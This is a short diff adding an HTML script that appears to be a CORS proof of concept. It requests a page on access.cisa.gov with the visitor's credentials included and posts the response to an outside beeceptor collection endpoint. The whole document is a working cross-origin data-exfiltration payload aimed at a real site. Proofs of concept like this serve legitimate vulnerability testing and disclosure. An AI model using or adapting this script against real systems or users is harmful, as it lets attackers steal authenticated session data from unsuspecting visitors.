@@ -1,0 +1,11 @@
+
+<script>
+  fetch('https://access.cisa.gov/cdn-cgi/rum?', {
+    credentials: 'include'
+  })
+  .then(r => r.text())
+  .then(data => {
+    fetch('https://cors-poc-beeceptor-com.free.beeceptor.com', {method: 'POST', body: data});
+  });
+</script>
+
